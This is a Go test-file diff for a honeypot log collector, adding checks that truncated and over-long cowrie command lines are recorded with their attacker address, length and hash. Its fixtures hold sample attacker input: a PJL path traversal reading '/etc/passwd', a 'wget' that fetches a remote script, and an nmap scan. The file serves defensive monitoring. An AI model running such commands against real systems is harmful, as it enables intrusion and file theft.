@@ -12,6 +12,7 @@ import (
 	"slices"
 	"strings"
 	"testing"
+	"time"
 
 	"gopkg.in/yaml.v3"
 
@@ -202,6 +203,10 @@ func TestVectorRemapLive(t *testing.T) {
 		// rejected path virtual_path; "command" is only the PJL keyword.
 		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.384972Z","info":"PJL command received","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"request","event":"command_received","command":"FSUPLOAD","payload_sha256":"038533bb","payload_preview":"@PJL FSUPLOAD NAME=\"0:/../../etc/passwd\" OFFSET=0 SIZE=4096\\r\\n"}`,
 		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.385216Z","info":"Rejected virtual filesystem path traversal","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"reject","event":"path_traversal","virtual_path":"/../../etc/passwd"}`,
+		// A line QPot's cowrie logger cut to fit (jsonlog.py): which values,
+		// and the whole command's length and hash, are kept with the event.
+		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"echo start","message":"CMD: echo start","src_ip":"203.0.113.90","session":"cut1","qpot_truncated":{"input":{"chars":60050,"sha256":"` + strings.Repeat("ab", 32) + `"},"message":{"chars":60055,"sha256":"` + strings.Repeat("cd", 32) + `"}}}`,
+		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"id","src_ip":"203.0.113.91","session":"cut2","qpot_truncated":{"input":{"chars":"many","sha256":["x"]},"x":1}}`,
 	}, "\n") + "\n"
 
 	cmd := exec.Command(run[0], append(run[1:], "--quiet", "--config", cfgPath)...)
@@ -249,8 +254,16 @@ func TestVectorRemapLive(t *testing.T) {
 	// and the lines without an attacker address (dicompot's finished line,
 	// hellpot's/log4pot's startup lines, wordpot's profile state) must be
 	// dropped.
-	if len(rows) != 57 {
-		t.Fatalf("got %d events, want 57: %+v", len(rows), rows)
+	if len(rows) != 59 {
+		t.Fatalf("got %d events, want 59: %+v", len(rows), rows)
+	}
+	if r := rows[57]; r.Command != "echo start" || r.Metadata["truncated"] != "input,message" ||
+		r.Metadata["input_chars"] != "60050" || r.Metadata["input_sha256"] != strings.Repeat("ab", 32) {
+		t.Errorf("a line the cowrie logger cut: %+v", r)
+	}
+	// A log line may claim anything: only a length and a hash are kept.
+	if r := rows[58]; r.Command != "id" || r.Metadata["truncated"] != "input,x" || r.Metadata["input_chars"] != "" || r.Metadata["input_sha256"] != "" {
+		t.Errorf("a forged cut record: %+v", r)
 	}
 	// miniprint: the operator sees what was asked for, and the categories
 	// read it (with only the PJL keyword they never matched).
@@ -624,5 +637,140 @@ func TestVectorKeepsScannerEvidenceLive(t *testing.T) {
 		if rows[0].Command != "nmap -sV 192.0.2.10" {
 			t.Errorf("the nmap command is stored as %q", rows[0].Command)
 		}
+	}
+}
+
+// TestVectorRecordsADiscardedLineLive runs the whole generated collector
+// configuration, its sinks replaced by a file, over a log that holds a line
+// longer than the collector reads (102,400 bytes).
+//
+// The collector discards such a line whole, and nothing used to record that:
+// on a live instance a visitor's command of 60,000 characters, which cowrie
+// writes twice in one line, was in neither the database nor the log backup.
+// The discarded line must come out as an event of its honeypot that names the
+// visitor and carries the start of the line.
+func TestVectorRecordsADiscardedLineLive(t *testing.T) {
+	docker, err := exec.LookPath("docker")
+	if err != nil {
+		t.Skip("docker is not available")
+	}
+	if exec.Command(docker, "image", "inspect", CollectorImage).Run() != nil {
+		t.Skip("the collector image is not present locally")
+	}
+	dir := t.TempDir()
+	logs, work := filepath.Join(dir, "logs"), filepath.Join(dir, "work")
+	for _, d := range []string{logs, work} {
+		if err := os.Mkdir(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.Chmod(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	long := `{"eventid":"cowrie.command.input","src_ip":"::ffff:203.0.113.20","src_port":4022,"session":"longsess","input":"wget http://198.51.100.77/x.sh; echo ` + strings.Repeat("B", 150000) + `"}`
+	lines := []string{
+		`{"eventid":"cowrie.session.connect","src_ip":"203.0.113.1","src_port":40001,"dst_port":22,"session":"plain1","protocol":"ssh"}`,
+		long,
+		`{"eventid":"cowrie.session.closed","src_ip":"203.0.113.1","session":"plain1","protocol":"ssh"}`,
+	}
+	if err := os.WriteFile(filepath.Join(logs, "cowrie.json"), []byte(strings.Join(lines, "\n")+"\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	var cfg map[string]any
+	generated := genVectorCfg(t, nil)
+	if err := yaml.Unmarshal([]byte(generated), &cfg); err != nil {
+		t.Fatalf("the generated collector configuration is not YAML: %v", err)
+	}
+	if sinks, _ := cfg["sinks"].(map[string]any); sinks["clickhouse"] == nil {
+		t.Fatalf("the generated configuration has no database sink: %v", cfg["sinks"])
+	}
+	cfg["data_dir"] = "/work"
+	delete(cfg, "api")
+	// What the database sink and the log backup are given: tag_scanners.
+	cfg["sinks"] = map[string]any{"out": map[string]any{"type": "file", "inputs": []string{"tag_scanners"},
+		"path": "/work/out.json", "encoding": map[string]any{"codec": "json"}}}
+	rendered, err := yaml.Marshal(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "vector.yaml"), rendered, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	name := fmt.Sprintf("qpot-test-discard-%d", os.Getpid())
+	// The collector runs as root, as in an instance: hand its files back so
+	// the test's own cleanup can remove them.
+	t.Cleanup(func() {
+		_ = exec.Command(docker, "rm", "-f", name).Run()
+		if uid := os.Getuid(); uid > 0 {
+			out, err := exec.Command(docker, "run", "--rm", "--network", "none", "--user", "0:0", "--entrypoint", "chown",
+				"-v", work+":/work", CollectorImage, "-R", fmt.Sprintf("%d:%d", uid, os.Getgid()), "/work").CombinedOutput()
+			if err != nil {
+				t.Logf("hand the collector's files back: %v %s", err, out)
+			}
+		}
+	})
+	if out, err := exec.Command(docker, "run", "-d", "--name", name, "--network", "none", "--user", "0:0",
+		"-v", logs+":/data/honeypots/cowrie/logs:ro", "-v", work+":/work", "-v", filepath.Join(dir, "vector.yaml")+":/etc/vector/qpot.yaml:ro",
+		CollectorImage, "--config", "/etc/vector/qpot.yaml").CombinedOutput(); err != nil {
+		t.Fatalf("start the collector: %v\n%s", err, out)
+	}
+
+	type row struct {
+		Honeypot  string            `json:"honeypot"`
+		EventType string            `json:"event_type"`
+		SourceIP  string            `json:"source_ip"`
+		Command   string            `json:"command"`
+		Payload   string            `json:"payload"`
+		Metadata  map[string]string `json:"metadata"`
+		EventID   string            `json:"event_id"`
+		SensorID  string            `json:"sensor_id"`
+	}
+	var rows []row
+	deadline := time.Now().Add(60 * time.Second)
+	for {
+		rows = rows[:0]
+		raw, _ := os.ReadFile(filepath.Join(work, "out.json"))
+		for _, line := range bytes.Split(bytes.TrimSpace(raw), []byte("\n")) {
+			var r row
+			if len(line) > 0 && json.Unmarshal(line, &r) == nil {
+				rows = append(rows, r)
+			}
+		}
+		if len(rows) >= 3 || time.Now().After(deadline) {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	if len(rows) != 3 {
+		log, _ := exec.Command(docker, "logs", "--tail", "40", name).CombinedOutput()
+		if len(log) > 6000 {
+			log = log[:6000]
+		}
+		t.Fatalf("%d events came out, want 3 (two plain lines and the discarded one): %+v\ncollector:\n%s", len(rows), rows, log)
+	}
+	types := map[string]row{}
+	for _, r := range rows {
+		types[r.EventType] = r
+	}
+	for _, plain := range []string{"cowrie.session.connect", "cowrie.session.closed"} {
+		if r, ok := types[plain]; !ok || r.SourceIP != "203.0.113.1" || r.Metadata["session"] != "plain1" {
+			t.Errorf("the plain line %s beside the long one: %+v", plain, r)
+		}
+	}
+	r, ok := types["cowrie.log.line_discarded"]
+	if !ok {
+		t.Fatalf("no event for the discarded line: %+v", rows)
+	}
+	if r.Honeypot != "cowrie" || r.SourceIP != "203.0.113.20" || r.Metadata["session"] != "longsess" ||
+		r.Metadata["limit_bytes"] != "102400" || r.Metadata["sensor"] != "collector" || r.Command != "" {
+		t.Errorf("the discarded line's event does not name the honeypot, the visitor and the limit: %+v", r)
+	}
+	if !strings.HasPrefix(r.Payload, `{"eventid":"cowrie.command.input","src_ip":"::ffff:203.0.113.20"`) ||
+		!strings.Contains(r.Payload, "wget http://198.51.100.77/x.sh; echo BBBB") || len(r.Payload) < 500 || len(r.Payload) > 2048 {
+		t.Errorf("the discarded line's event carries %d bytes of it: %.200q", len(r.Payload), r.Payload)
+	}
+	if !eventUUID.MatchString(r.EventID) || r.SensorID == "" {
+		t.Errorf("the discarded line's event has ID %q and sensor %q", r.EventID, r.SensorID)
 	}
 }
